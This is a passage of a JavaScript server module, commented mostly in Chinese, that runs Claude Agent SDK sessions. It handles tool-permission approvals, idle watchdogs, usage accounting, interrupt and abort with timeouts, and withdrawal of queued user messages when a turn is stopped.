          ws.send(createNormalizedMessage({ kind: 'permission_cancelled', requestId, reason, sessionId: capturedSessionId || sessionId || null, provider: 'claude' }));
        }
      });
      if (!decision) {
        return { behavior: 'deny', message: APPROVAL_UNANSWERED_MESSAGE };
      }

      if (decision.cancelled) {
        return { behavior: 'deny', message: 'Permission request cancelled' };
      }

      if (decision.allow) {
        // 客户端给的条目先过服务端校验(见 rememberablePermissionEntry),不过的只放行这一次
        const remembered = rememberablePermissionEntry(decision.rememberEntry, { toolName, input, actorUsername: options.actorUsername });
        if (remembered) {
          if (!sdkOptions.allowedTools.includes(remembered)) {
            sdkOptions.allowedTools.push(remembered);
          }
          if (Array.isArray(sdkOptions.disallowedTools)) {
            sdkOptions.disallowedTools = sdkOptions.disallowedTools.filter(entry => entry !== remembered);
          }
        }
        return { behavior: 'allow', updatedInput: decision.updatedInput ?? input };
      }

      return { behavior: 'deny', message: decision.message ?? 'User denied tool use' };
    };

    let queryInstance;
    // 提示先备好(带图时要读盘),再做最后一次中止检查:读盘那段 await 里按的停止也要拦下
    const prompt = await createPrompt();
    /**
     * 起 query 之前再检查一次中止标记:函数开头那道检查到这里之间还有一串 await(releaseClaudeSession、
     * 模型解析、loadMcpConfig 等,加起来能到秒级),这段时间里按的停止只能在这里拦下。
     * 这是最后一个还能不启动子进程的位置。
     */
    if ((sessionId ? abortedSessionIds.delete(sessionId) : false) || runEntry?.aborted) {
      log.info(`[Claude SDK] 回合在准备期间被中止,不再启动 SDK(session=${sessionId || 'NEW'})`);
      return oneShotOutcome({ ok: false, aborted: true, sessionId: sessionId || null });
    }

    try {
      queryInstance = query({
        prompt,
        options: sdkOptions
      });
    } catch (hookError) {
      // Some SDK versions may not accept these hook shapes.
      // Keep notification behavior operational via runtime events even if hook registration fails.
      log.warn('Failed to initialize Claude query with hooks, retrying without hooks:', hookError?.message || hookError);
      delete sdkOptions.hooks;
      queryInstance = query({
        prompt: await createPrompt(),
        options: sdkOptions
      });
    }

    // Track the query instance for abort capability — both by session id and
    // on the gateway run entry (abort-by-runId before the id is known).
    if (runEntry) {
      runEntry.queryInstance = queryInstance;
      runEntry.oneShotAbortController = oneShotAbortController;
    }
    if (capturedSessionId) {
      addSession(capturedSessionId, queryInstance, ws, oneShotAbortController);
    }
    // 提示已经交给 CLI 子进程:这一条开跑了
    notifyTurnStarted(options.onTurnStarted);

    /**
     * 一次性路径的静默看门狗(这条路服务外部 API、定时任务,以及常驻池满时的降级回退)。
     *
     * 子进程可能停止输出却不退出(例如网关在两步之间断流),这时下面的 `for await` 会永远挂着,且不会自愈:
     *   - `activeOneShotFallbacks` 永不减 1,并发预算被占掉一格;
     *   - 该会话的 run 永远 running,网页端后续消息只能进 pendingSends、30 分钟后过期;
     *   - 同步 API 对该会话恒返 409。
     *
     * 判据用 idleMs(默认 60 分钟,见 readTurnWatchdogConfig):流上每来一条消息就续期,到点 abort。
     * 不用 absoluteMs:一次性路径跑的常是长任务(定时回归、批量分析),绝对上限会误杀正常任务。
     * 与常驻路径不同,这里没有工具在途豁免。
     */
    const oneShotWatchdogMs = readTurnWatchdogConfig().idleMs;
    let oneShotWatchdog = null;
    const clearOneShotWatchdog = () => {
      if (oneShotWatchdog) { clearTimeout(oneShotWatchdog); oneShotWatchdog = null; }
    };
    const armOneShotWatchdog = () => {
      if (!oneShotWatchdogMs) return; // 配 0 表示显式关掉
      clearOneShotWatchdog();
      oneShotWatchdog = setTimeout(() => {
        log.warn(
          `[claude-sdk] 一次性回合静默超过 ${oneShotWatchdogMs}ms,判定悬死并中止(session=${capturedSessionId || 'NEW'})`,
        );
        try { oneShotAbortController.abort(); } catch { /* best effort */ }
      }, oneShotWatchdogMs);
      // 看门狗不该把进程钉在事件循环里
      if (typeof oneShotWatchdog.unref === 'function') oneShotWatchdog.unref();
    };

    // 这一轮的用量累加器(见 createUsageAccumulator / mergeResultUsage)。
    const oneShotUsage = createUsageAccumulator();
    const oneShotStartedAt = Date.now();
    /** result 帧报告的业务失败(见下面赋值处)。 */
    let oneShotResultIsError = false;
    /** 失败原因原文,随 outcome 交给调用方记进运行记录。 */
    let oneShotResultError = null;

    log.info('Starting async generator loop for session:', capturedSessionId || 'NEW');
    armOneShotWatchdog();
    /** 一次性进程的 CLI 版本与工具摘要(见 noteCliInit),每个进程记一行日志。 */
    const oneShotCliInfo = {};
    try {
    for await (const message of queryInstance) {
      armOneShotWatchdog(); // 有动静就续期
      noteCliInit(oneShotCliInfo, message, `一次性回合 ${capturedSessionId || sessionId || 'NEW'}`);
      // Capture session ID from first message
      if (message.session_id && !capturedSessionId) {

        capturedSessionId = message.session_id;
        addSession(capturedSessionId, queryInstance, ws, oneShotAbortController);

        if (ws.setSessionId && typeof ws.setSessionId === 'function') {
          ws.setSessionId(capturedSessionId);
        }

        // Send session-created event only once for new sessions
        if (!sessionId && !sessionCreatedSent) {
          sessionCreatedSent = true;
          ws.send(createNormalizedMessage({ kind: 'session_created', newSessionId: capturedSessionId, sessionId: capturedSessionId, provider: 'claude' }));
        }
      } else {
        // session_id already captured
      }

      // Transform and normalize message via adapter
      const transformedMessage = transformMessage(message);
      const sid = capturedSessionId || sessionId || null;

      /**
       * 一次性路径同样走任务生命周期通道:定时任务与外部 Agent API 的会话里也有转后台的 Bash / 子代理,
       * 而 `normalizeMessage` 会把 `system/task_*` 变成 `[]`,不在这里转发的话,那一行会永远停在
       * 「running in the background」的 tool_result 上。
       */
      const taskRowOneShot = taskLifecycleMessage(message, sid);
      if (taskRowOneShot) {
        ws.send(taskRowOneShot);
        continue;
      }

      // Use adapter to normalize SDK events into NormalizedMessage[]
      const normalized = sessionsService.normalizeMessage('claude', transformedMessage, sid);
      for (const msg of normalized) {
        // Preserve parentToolUseId from SDK wrapper for subagent tool grouping
        if (transformedMessage.parentToolUseId && !msg.parentToolUseId) {
          msg.parentToolUseId = transformedMessage.parentToolUseId;
        }
        ws.send(msg);
      }

      // Extract and send token budget updates from assistant/result usage payloads.
      // 子代理帧不刷新主上下文环:它的 usage 是子代理自己的上下文,不是主对话的。
      // 一次性路径没有 runtime,传入请求的模型与它的目录窗口(见 resolveContextWindowTokens)。
      const tokenBudgetData = message?.parent_tool_use_id
        ? null
        : extractTokenBudget(message, { contextWindow, currentModel: toSdkModel(resolvedModel || options.model) });
      if (tokenBudgetData) {
        ws.send(createNormalizedMessage({ kind: 'status', text: 'token_budget', tokenBudget: tokenBudgetData, sessionId: capturedSessionId || sessionId || null, provider: 'claude' }));
      }

      // 逐条累加这一轮的 token,result 帧到了就记一条账。
      accumulateUsage(oneShotUsage, message);
      if (message?.type === 'result' && !message?.parent_tool_use_id) {
        /**
         * 记下这一轮业务上是否成功。迭代器没抛异常不等于成功:SDK 的 `result` 帧自带 `is_error` / `subtype`
         * (如超出轮次上限、被 CLI 侧拒绝),调用方(外部 API 的同步响应、定时任务的运行记录)要据此区分
         * 「模型没做完」和「做完了」。
         */
        oneShotResultError = describeOneShotResultError(message);
        oneShotResultIsError = oneShotResultError !== null;
        // 模型健康度(定时任务 / 外部 API 的回合也算)
        recordModelTurnStat(message, { model: options.model ?? null, source: options.usageSource || 'chat' });
        recordTurnUsage(oneShotUsage, message, {
          // app 会话 id 优先(即 options.runId)。
          sessionId: (typeof options.runId === 'string' && options.runId)
            || capturedSessionId || sessionId || null,
          projectPath: options.cwd ?? null,
          userId: ws?.userId ?? null,
          username: options.actorUsername ?? null,
          model: options.model ?? null,
          // 定时任务和外部 API 都走一次性路径,记清触发来源,费用才能按来源归属。
          source: options.usageSource ?? 'chat',
          durationMs: Date.now() - oneShotStartedAt,
        });
      }
    }
    } finally {
      // 无论正常结束、抛错还是被中止都要撤掉看门狗:否则它会在回合结束后触发、打一行误导性的日志,
      // 闭包还会拖住这一轮的对象不被回收。
      clearOneShotWatchdog();
    }

    if (capturedSessionId) {
      removeSession(capturedSessionId);
    }

    // Send the terminal completion event — skipped for aborted runs, whose
    // terminal `complete` (aborted: true) was already sent by abort-session
    // (or by the runId abort route for runs without a native id yet).
    const wasAborted = (capturedSessionId ? abortedSessionIds.delete(capturedSessionId) : false)
      || Boolean(runEntry?.aborted);
    if (!wasAborted) {
      // 业务失败如实报 exitCode 1(见 oneShotResultIsError)。
      ws.send(createCompleteMessage({
        provider: 'claude',
        sessionId: capturedSessionId || sessionId || null,
        exitCode: oneShotResultIsError ? 1 : 0,
      }));
    }
    notifyRunStopped({
      userId: ws?.userId || null,
      provider: 'claude',
      sessionId: capturedSessionId || sessionId || null,
      sessionName: sessionSummary,
      stopReason: wasAborted ? 'aborted' : (oneShotResultIsError ? 'failed' : 'completed'),
    });
    // 成败随返回值交给调用方:writer 上的帧只有浏览器在看,定时任务与外部 API 看返回值。
    return oneShotOutcome({
      ok: !wasAborted && !oneShotResultIsError,
      aborted: wasAborted,
      error: oneShotResultError,
      sessionId: capturedSessionId || sessionId || null,
    });

  } catch (error) {
    // stderr 一起打出来 —— 单独一句 "exited with code 1" 在日志里定位不了任何东西。
    log.error('SDK query error:', stderrTail.describe(error));

    if (capturedSessionId) {
      removeSession(capturedSessionId);
    }

    const wasAborted = (capturedSessionId ? abortedSessionIds.delete(capturedSessionId) : false)
      || Boolean(runEntry?.aborted);
    if (wasAborted) {
      // The abort already produced the terminal complete; a generator throw
      // caused by interrupt() is expected noise, not a user-facing error.
      return oneShotOutcome({ ok: false, aborted: true, sessionId: capturedSessionId || sessionId || null });
    }

    // Check if Claude CLI is installed for a clearer error message
    const installed = await providerAuthService.isProviderInstalled('claude');
    const errorContent = !installed
      ? 'Claude Code is not installed. Please install it first: https://docs.anthropic.com/en/docs/claude-code'
      : stderrTail.describe(error);

    // Send error to WebSocket, then the terminal complete
    ws.send(createNormalizedMessage({ kind: 'error', content: errorContent, sessionId: capturedSessionId || sessionId || null, provider: 'claude' }));
    ws.send(createCompleteMessage({ provider: 'claude', sessionId: capturedSessionId || sessionId || null, exitCode: 1 }));
    notifyRunFailed({
      userId: ws?.userId || null,
      provider: 'claude',
      sessionId: capturedSessionId || sessionId || null,
      sessionName: sessionSummary,
      error
    });
    // 以带 exitCode 的失败结果返回,不 reject:一次性路径的调用方已经有 `.finally` 收尾,
    // reject 会让 `chat.send` 的网关路径多出一个未处理的拒绝。
    return oneShotOutcome({
      ok: false,
      error: errorContent,
      sessionId: capturedSessionId || sessionId || null,
      rejected: Boolean(error?.prismModelRejected),
    });
  } finally {
    // 进程已经结束(或根本没起来),带 key 的 flag 设置文件不再保留
    removeFlagSettingsFile(oneShotFlagSettingsFile);
  }
}

/**
 * runtime 控制指令(setPermissionMode / setModel / cancelAsyncMessage / stopTask 等)的超时竞速。
 *
 * 这些调用是与子进程的 IPC 往返,子进程僵死时会永远挂住;其中切档 / 换模型 / 改档位跑在那段对话的锁里
 * (见 withSessionLock),一个僵死的 CLI 会让这段对话之后的每一条消息都排在锁上出不来。
 * 超时即拒绝;调用处已有 catch → dispose → 重建 runtime 的兜底,超时会自然换一个干净的 CLI。
 */
const RUNTIME_CONTROL_TIMEOUT_MS = (() => {
  const parsed = parseInt(process.env.PRISM_RUNTIME_CONTROL_TIMEOUT_MS, 10);
  return Number.isFinite(parsed) && parsed > 0 ? parsed : 10_000;
})();

async function withRuntimeControlTimeout(promise, label) {
  let timer = null;
  // 超时放弃后原 promise 可能才姗姗来迟地 reject —— 接住,别变成 unhandledRejection。
  promise.catch(() => {});
  try {
    return await Promise.race([
      promise,
      new Promise((_resolve, reject) => {
        timer = setTimeout(
          () => {
            const timeout = new Error(`${label} did not answer within ${RUNTIME_CONTROL_TIMEOUT_MS}ms`);
            // 超时与「CLI 回了拒绝」要分开:前者重建 runtime(卡死的逃生口),后者原样报给用户。
            timeout.prismControlTimeout = true;
            reject(timeout);
          },
          RUNTIME_CONTROL_TIMEOUT_MS,
        );
        timer.unref?.();
      }),
    ]);
  } finally {
    if (timer) clearTimeout(timer);
  }
}

const INTERRUPT_TIMEOUT_MS = 5000;

/**
 * 没有用户回合时,后台子代理审批请求的去处。由组合根注入,返回一个 writer(send / sendAndCountDelivered);
 * 拿不到 writer 时直接拒绝。
 */
let backgroundApprovalWriterFactory = null;
export function setBackgroundApprovalWriterFactory(factory) {
  backgroundApprovalWriterFactory = typeof factory === 'function' ? factory : null;
}
/** CLI 自己那一轮(没有用户回合)的主线程要审批时最多等多久(见常驻路径的 canUseTool)。 */
const ORPHAN_MAIN_APPROVAL_TIMEOUT_MS = 2 * 60 * 1000;
/** 后台审批没人回答时多久后拒绝(PRISM_BACKGROUND_APPROVAL_TIMEOUT_MS,0 = 一直等)。 */
const BACKGROUND_APPROVAL_TIMEOUT_MS = (() => {
  const parsed = parseInt(process.env.PRISM_BACKGROUND_APPROVAL_TIMEOUT_MS ?? '', 10);
  return Number.isFinite(parsed) && parsed >= 0 ? parsed : 30 * 60 * 1000;
})();
/**
 * 中断后这段时间内,CLI 为被打断的前台命令发出的 `task_started` 一律 `stopTask`。
 * 中断落在前台 Bash 上时 CLI 不杀它,而是约 2 秒后把它转成后台任务继续跑,回合要等命令跑完才出 result。
 */
const INTERRUPT_STOP_WINDOW_MS = 8000;
/** runtime 上记录的合流 uuid 上限(只用于撤回 / 归属,超出时丢弃最老的)。 */
const MERGED_UUIDS_MAX = 64;

/**
 * interrupt() 加超时竞速。
 *
 * interrupt() 是与子进程的协商,请它体面收尾;但用户按停止的高频场景恰恰是子进程已经僵死,协商没有回音,
 * `await` 会挂住,终止帧发不出去。超时(默认 5s)即放弃协商,由调用方升级到 abortController 强制中止。
 * 原 promise 要挂兜底 catch:超时后它可能才迟迟 reject,不接住就是 unhandledRejection。
 */
async function interruptWithTimeout(queryLike, label, timeoutMs = INTERRUPT_TIMEOUT_MS, interruptOptions = undefined) {
  let timer = null;
  // `interrupt({ cancelQueued })`:SDK 运行时接受这个参数,但 `sdk.d.ts` 里没有声明(对应能力位 interrupt_cancel_queued_v1)。
  const interruptPromise = interruptOptions ? queryLike.interrupt(interruptOptions) : queryLike.interrupt();
  interruptPromise.catch(() => { /* 超时放弃后迟到的拒绝,不让它变成 unhandled */ });
  try {
    return await Promise.race([
      interruptPromise,
      new Promise((_resolve, reject) => {
        timer = setTimeout(
          () => reject(new Error(`interrupt() timed out after ${timeoutMs}ms (${label})`)),
          timeoutMs,
        );
      }),
    ]);
  } finally {
    if (timer) clearTimeout(timer);
  }
}

/**
 * 合流消息的去向通知(撤回 / 已送达)。本模块不依赖 websocket 层,由组合根接线。
 * 事件:`{ type: 'withdrawn' | 'delivered', appSessionId, uuids, reason? }`。
 */
let mergedMessageHook = null;
export function setMergedMessageHook(hook) {
  mergedMessageHook = typeof hook === 'function' ? hook : null;
}

function emitMergedEvent(runtime, type, uuids, reason = null) {
  const merged = runtime?.mergedUuids;
  if (!(merged instanceof Map) || !Array.isArray(uuids) || uuids.length === 0) return;
  const bySession = new Map();
  for (const uuid of uuids) {
    const entry = merged.get(uuid);
    if (!entry) continue;
    merged.delete(uuid);
    const list = bySession.get(entry.appSessionId) ?? [];
    list.push(uuid);
    bySession.set(entry.appSessionId, list);
  }
  if (!mergedMessageHook) return;
  for (const [appSessionId, list] of bySession) {
    try {
      mergedMessageHook({ type, appSessionId, uuids: list, reason });
    } catch (error) {
      log.warn('[Claude SDK] merged-message hook failed:', error?.message || error);
    }
  }
}

/**
 * 按中断回执撤掉仍在 CLI 队列里的合流消息。
 *
 * 合流把用户中途发的话推进 CLI 队列,CLI 不一定马上折进这一轮(前台工具跑着时会排队)。按停止时它能活过中断,
 * 回合一结束 CLI 接着就跑它:用户以为停了,模型照样执行了那句话。
 *
 * - 带了 `cancelQueued`(能力位 interrupt_cancel_queued_v1):回执的 `cancelled` 就是撤掉的;
 * - 只有回执(interrupt_receipt_v1):`still_queued` 里属于我们合流的,逐条 `cancelAsyncMessage`(返回 true 才算撤到);
 * - 都没有(旧版 CLI):什么都不做。
 */
export async function settleMergedAfterInterrupt(runtime, queryLike, receipt) {
  const merged = runtime?.mergedUuids;
  if (!(merged instanceof Map) || merged.size === 0 || !receipt || typeof receipt !== 'object') return [];
  const withdrawn = [];
  const cancelled = Array.isArray(receipt.cancelled) ? receipt.cancelled : [];
  for (const uuid of cancelled) if (merged.has(uuid)) withdrawn.push(uuid);
  const stillQueued = Array.isArray(receipt.still_queued) ? receipt.still_queued : [];
  if (stillQueued.some((uuid) => merged.has(uuid)) && typeof queryLike?.cancelAsyncMessage === 'function') {
    for (const uuid of stillQueued) {
      if (!merged.has(uuid) || withdrawn.includes(uuid)) continue;
      try {
        // `cancelAsyncMessage` 同样是运行时有、d.ts 没声明的方法;返回 true 表示已从队列撤掉
        const ok = await withRuntimeControlTimeout(queryLike.cancelAsyncMessage(uuid), 'cancelAsyncMessage');
        if (ok === true) withdrawn.push(uuid);
      } catch (error) {
        log.warn(`[Claude SDK] 撤回合流消息 ${uuid} 失败:`, error?.message || error);
      }
    }
  }
  if (withdrawn.length > 0) {
    log.info(`[Claude SDK] 停止时撤回了 ${withdrawn.length} 条合流消息(runtime=${runtime.key})`);
    emitMergedEvent(runtime, 'withdrawn', withdrawn, 'aborted');
  }
  return withdrawn;
}

/**
 * 停止即真停:所有对常驻 runtime 的中断都走这里。
 *
 * 1. 记下此刻在途的顶层 tool_use:之后几秒里 CLI 把它们转成后台任务时(task_started 带同一个 tool_use_id),
 *    读循环立刻 `stopTask`(见 stopInterruptBackgroundedTask);
 * 2. 先发出撤回合流消息的请求(withdrawMergedBeforeInterrupt),再发普通中断;
 * 3. 按中断回执收尾仍在队列里的合流消息(见 settleMergedAfterInterrupt)。
 *
 * 不带 `cancelQueued:true`:CLI 会把主线程队列整个清空,后台任务的完成通知、会话内定时触发也会一起丢掉
 * (模型永远不知道后台那个构建跑完了)。
 */
async function interruptRuntime(runtime, queryLike, label) {
  if (runtime) {
    runtime.interruptStopWindow = {
      toolUseIds: new Set(runtime.pendingToolUses ?? []),
      until: Date.now() + INTERRUPT_STOP_WINDOW_MS,
    };
  }
  // 先撤插话、再中断:回执要等中断落定才回来,而模型只剩最后一段文字时中断几乎是瞬时的,CLI 的出队循环
  // 会在按回执去撤之前就把那条 'next' 插话当新一轮跑起来。撤回请求先发出(控制请求按顺序进 stdin,
  // CLI 先处理),不等回包就发中断:CLI 卡住时停止照样 5 秒后升级为强制中止,不被撤回的超时拖住。
  const withdrawing = runtime ? withdrawMergedBeforeInterrupt(runtime, queryLike, 'aborted') : Promise.resolve([]);
  const receipt = await interruptWithTimeout(queryLike, label, INTERRUPT_TIMEOUT_MS);
  let raceTimer = null;
  await Promise.race([withdrawing, new Promise((resolve) => { raceTimer = setTimeout(resolve, 1000); })]);
  if (raceTimer) clearTimeout(raceTimer);
  if (runtime) await settleMergedAfterInterrupt(runtime, queryLike, receipt);
  return receipt;
}

/** 停止前先把还排在 CLI 队列里的插话撤掉(并行,各自带超时);撤到的报"停止时一并撤回"。 */
export async function withdrawMergedBeforeInterrupt(runtime, queryLike, reason = 'aborted') {
  const merged = runtime?.mergedUuids;
  if (!(merged instanceof Map) || merged.size === 0 || typeof queryLike?.cancelAsyncMessage !== 'function') return [];
  const uuids = [...merged.keys()];
  // 每个 cancelAsyncMessage 在 map 回调里同步发出(请求当场写进 stdin),之后才各自等回包
  const results = await Promise.all(uuids.map(async (uuid) => {
    try {
      return (await withRuntimeControlTimeout(queryLike.cancelAsyncMessage(uuid), 'cancelAsyncMessage')) === true ? uuid : null;
    } catch {
      return null;
    }
  }));
  const withdrawn = results.filter(Boolean);
  if (withdrawn.length > 0) emitMergedEvent(runtime, 'withdrawn', withdrawn, reason);
  return withdrawn;
}

/** 读循环调用:被中断的前台命令转成了后台任务时停掉它。返回是否发了 stopTask。 */
export function stopInterruptBackgroundedTask(runtime, message) {
  const window = runtime?.interruptStopWindow;
  if (!window || message?.type !== 'system' || message.subtype !== 'task_started') return false;
  if (Date.now() > window.until) {
    runtime.interruptStopWindow = null;
    return false;
  }
  const toolUseId = typeof message.tool_use_id === 'string' ? message.tool_use_id : null;
  if (!toolUseId || !window.toolUseIds.has(toolUseId) || typeof message.task_id !== 'string') return false;
  window.toolUseIds.delete(toolUseId);
  if (typeof runtime.query?.stopTask !== 'function') return false;
  log.info(`[Claude SDK] 停止:被打断的前台命令转成了后台任务 ${message.task_id}(tool_use ${toolUseId}),停掉它`);
  Promise.resolve()
    .then(() => withRuntimeControlTimeout(runtime.query.stopTask(message.task_id), 'stopTask'))
    .catch((error) => log.warn(`[Claude SDK] stopTask(${message.task_id}) 失败:`, error?.message || error));
  return true;
}

/** 在这个 runtime 上记一条合流 uuid(撤回 / 归属用),超上限丢最老的。 */
function rememberMergedUuid(runtime, uuid, appSessionId) {
  if (!(runtime.mergedUuids instanceof Map)) runtime.mergedUuids = new Map();
  runtime.mergedUuids.set(uuid, { appSessionId, at: Date.now() });
  while (runtime.mergedUuids.size > MERGED_UUIDS_MAX) {
    const oldest = runtime.mergedUuids.keys().next().value;
    runtime.mergedUuids.delete(oldest);
  }
}

/**
 * 用户撤回一条合流消息(`chat.cancel-queued` 带 uuid)。
 * 还在 CLI 队列里就用 `cancelAsyncMessage` 撤掉;已经被模型读到则撤不回,如实返回。
 */
export async function cancelMergedMessage(appSessionId, uuid) {
  if (typeof uuid !== 'string' || !uuid) return { cancelled: false, reason: 'invalid' };
  let runtime = null;
  for (const candidate of claudeRuntimes.values()) {
    if (candidate.mergedUuids instanceof Map && candidate.mergedUuids.get(uuid)?.appSessionId === appSessionId) {
      runtime = candidate;
      break;
    }
  }
  if (!runtime || runtime.disposed) return { cancelled: false, reason: 'unknown' };
  if (typeof runtime.query?.cancelAsyncMessage !== 'function') return { cancelled: false, reason: 'unsupported' };
  try {
    const ok = await withRuntimeControlTimeout(runtime.query.cancelAsyncMessage(uuid), 'cancelAsyncMessage');
    if (ok === true) {
      emitMergedEvent(runtime, 'withdrawn', [uuid], 'cancelled');
      return { cancelled: true };
    }
    return { cancelled: false, reason: 'consumed' };
  } catch (error) {
    return { cancelled: false, reason: 'error', error: error?.message || String(error) };
  }
}

/**
 * 合流消息已被 CLI 读进某一轮(result 的 `user_message_uuids` 里有它),撤不回了,通知界面收起「撤回」。
 */
export function noteMergedDelivered(runtime, message) {
  const merged = runtime?.mergedUuids;
  if (!(merged instanceof Map) || merged.size === 0 || !message) return;
  const echoed = new Set();
  if (typeof message.user_message_uuid === 'string') echoed.add(message.user_message_uuid);
  if (Array.isArray(message.user_message_uuids)) for (const id of message.user_message_uuids) if (typeof id === 'string') echoed.add(id);
  // msg_lifecycle_v1:`started` 就是送进了某一轮(CLI 里标 @internal,只拿来收起按钮,不做判据)
  if (message.type === 'command_lifecycle' && message.state === 'started' && typeof message.command_uuid === 'string') {
    echoed.add(message.command_uuid);
  }
  const hits = [...echoed].filter((id) => merged.has(id));
  // Prism 的回合已经结束(runtime.turn 为空)时才被读到,说明它没折进那一轮,而是自己成了一轮(插话发在最后一段文字时)。
  // 这只作为原因带出去(日志);落库那一行不改 interjection:它的位置在上一轮最后那段文字之前,
  // 改成回合边界会把上一轮的回答与产出卡切到它名下。
  if (hits.length > 0) emitMergedEvent(runtime, 'delivered', hits, runtime.turn ? null : 'own_turn');
}

/**
 * Aborts an active SDK session
 * @param {string} sessionId - Session identifier (provider-native id)
 * @param {Object} [context] - Optional gateway context
 * @param {string} [context.runId] - Gateway runId fallback: aborts the run
 *   registered under this id when no session matches (a brand-new
 *   conversation's first turn has no provider-native id yet)
 * @returns {Promise<boolean>} True if session was aborted, false if not found
 */
async function abortClaudeSDKSession(sessionId, context = {}) {
  const session = sessionId ? getSession(sessionId) : null;

  if (!session) {
    if (context && typeof context.runId === 'string' && context.runId) {
      return abortClaudeSDKRun(context.runId);
    }
    log.info(`Session ${sessionId} not found`);
    return false;
  }

  const runEntry = context && typeof context.runId === 'string' && context.runId
    ? activeChatRuns.get(context.runId) || null
    : null;

  try {
    log.info(`Aborting SDK session: ${sessionId}`);

    // Mark before interrupting so the run loop knows not to emit its own
    // terminal complete (the abort handler sends the aborted one). The
    // gateway run entry gets the same flag so teardown rejections are
    // classified as aborts rather than failures.
    // 停止标记在第一个 await 之前记下(abortClaudeSDKRun 同样):chat 层发起中止后紧接着按"这一条不会再开跑"处理。
    abortedSessionIds.add(sessionId);
    if (runEntry) runEntry.aborted = true;
    disarmForeignResultGuard(runEntry?.runtime || getPersistentRuntime(sessionId));

    try {
      const owningRuntime = runEntry?.runtime
        || [...claudeRuntimes.values()].find((candidate) => candidate.query === session.instance)
        || null;
      // 收尾那几秒里新来的话不再合流进这一轮(见 mergeRefusalReason 的 turn-stopping)
      if (owningRuntime?.turn) owningRuntime.turn.stopping = true;
      if (owningRuntime) await interruptRuntime(owningRuntime, session.instance, `session ${sessionId}`);
      else await interruptWithTimeout(session.instance, `session ${sessionId}`);
    } catch (interruptError) {
      // 协商超时 / 失败:升级为强制中止。abortController 直接拆掉 query 并杀掉子进程,
      // run 循环会以 AbortError 收尾(runEntry.aborted 已置,按中止归类)。
      if (session.abortController) {
        log.error(
          `[Claude SDK] interrupt failed for ${sessionId}, escalating to hard abort:`,
          interruptError?.message || interruptError,
        );
        try { session.abortController.abort(); } catch { /* best effort */ }
      } else {
        // 没有强制中止手柄(正常不会发生,两条路径都会传):当作中止失败,run 继续,由它自己发终止帧。
        throw interruptError;
      }
    }

    session.status = 'aborted';
    removeSession(sessionId);

    return true;
  } catch (error) {
    log.error(`Error aborting session ${sessionId}:`, error);
    // The run keeps going; let it emit its own terminal complete.
    abortedSessionIds.delete(sessionId);
    if (runEntry) runEntry.aborted = false;
    return false;
  }
}

/**
 * Checks if an SDK session is currently active
 * @param {string} sessionId - Session identifier
 * @returns {boolean} True if session is active
 */
function isClaudeSDKSessionActive(sessionId) {
  const session = getSession(sessionId);
  return session && session.status === 'active';
}

/**
 * Gets all active SDK session IDs
 * @returns {Array<string>} Array of active session IDs
 */
function getActiveClaudeSDKSessions() {
  return getAllSessions();
}

/**
 * 关停时清空整个常驻池。
 *
 * 空闲(无 turn)的 runtime 不在 activeSessions 里,不会随会话 abort 一起收掉;这里显式 dispose 每个子进程,
 * 而不是依赖父进程退出时管道断开把它们连带退出。
 */
async function disposeAllRuntimes() {
  const runtimes = [...claudeRuntimes.values()];
  if (runtimes.length === 0) return 0;
  await Promise.allSettled(runtimes.map((runtime) => disposePersistentRuntime(runtime)));
  return runtimes.length;
}

/**
 * 一条待批请求是否挂在这个会话上:provider 原生 id 或 app 会话 id 命中都算。
 *
 * `canUseTool` 可能在流里第一条消息回来之前触发,这时请求的 `_sessionId`(provider 原生 id)永远是 null,
 * 而查询方总拿非空 id 来问;只比 `_sessionId` 的话,这条请求在刷新、重连、切回会话时都补发不出来。
 * app 会话 id 从第一轮就存在,用它兜底。
 *
 * 空的 sessionId 一律不命中,否则 `null === null` 会让还没拿到 id 的请求被当成属于每一个还没拿到 id 的会话。
 *
 * @param {{_sessionId?: unknown, _appSessionId?: unknown}} resolver
 * @param {string} sessionId provider 原生 id 或 app 会话 id
 */
export function approvalBelongsToSession(resolver, sessionId) {
  if (!sessionId || !resolver) return false;
  return resolver._sessionId === sessionId || resolver._appSessionId === sessionId;
}

/**
 * Get pending tool approvals for a specific session.
 * @param {string} sessionId - app 会话 id 或 provider 原生 id
 * @returns {Array} Array of pending permission request objects
 */
function getPendingApprovalsForSession(sessionId) {
  const pending = [];
  if (!sessionId) return pending;
  for (const [requestId, resolver] of pendingToolApprovals.entries()) {
    if (approvalBelongsToSession(resolver, sessionId)) {
      pending.push({
        requestId,
        toolName: resolver._toolName || 'UnknownTool',
        input: resolver._input,
        context: resolver._context,
        sessionId,
        receivedAt: resolver._receivedAt || new Date(),
        // 与实时那一帧同样的两个标记:刷新 / 重连后补发的卡片也不出「允许并记住」、也标着后台任务请求
        ...(resolver._background ? { background: true } : {}),
        ...(resolver._suppressAlwaysAllow ? { suppressAlwaysAllow: true } : {}),
      });
    }
  }
  return pending;
}

/* ===================================================================== */
/*  Persistent runtime layer — 部分实现源自 Claude Code Web(Apache-2.0),已修改;版权与许可见 NOTICE。  */
/*                                                                        */
/*  One resident SDK `query()` per conversation, fed by an async input    */
/*  queue. Each turn pushes only the current user message — the SDK owns  */
/*  the conversation history, so nothing is replayed and the native       */
/*  session id stays stable across turns, /compact included.              */
/*  Writers reattach to a running turn through the gateway's              */
/*  `chatRunRegistry.attachConnection`, not through this module.          */
/* ===================================================================== */

const PERSISTENT_ENABLED = process.env.PRISM_PERSISTENT_SESSIONS !== '0';
const CHECKPOINTS_ENABLED = process.env.PRISM_CHECKPOINTS !== '0';
/**
 * 自动压缩由 CLI 自己做(CLI 默认开启 autoCompactEnabled)。Prism 不主动推 `/compact`,只做三件事:
 * 读 `getContextUsage` 画用量环、接住 CLI 发的压缩帧画进度、用户手打 `/compact` 时照常走。
 *
 * 压缩因此发生在用户回合内部,用用户回合的预算(压缩阶段另有更短的静默上限,见 readCompactionIdleTimeout)。
 * 不要把压缩挪回由 Prism 推动的独立维护回合:`includePartialMessages = false` 时压缩期间流上一帧都没有,
 * CLI 遇到 "prompt too long" 还会丢消息重试,短预算必然超时;压缩失败后占比仍然过线,每个回合结束都会
 * 再触发一次注定失败的压缩。
 *
 * 「什么时候压」通过下面两个环境变量透传给 CLI 自己的开关。
 */
/** `0` = 让 CLI 关掉自动压缩(不再有任何自动压缩);默认跟随 CLI(开)。 */
const AUTO_COMPACT_ENABLED = process.env.PRISM_AUTO_COMPACT !== '0';
/** CLI 的自动压缩窗口(token 数)。不配 = 用 CLI 自己的默认。 */
const AUTO_COMPACT_WINDOW = (() => {
  const parsed = parseInt(process.env.PRISM_AUTO_COMPACT_WINDOW, 10);
  return Number.isFinite(parsed) && parsed > 0 ? parsed : null;
})();

/**
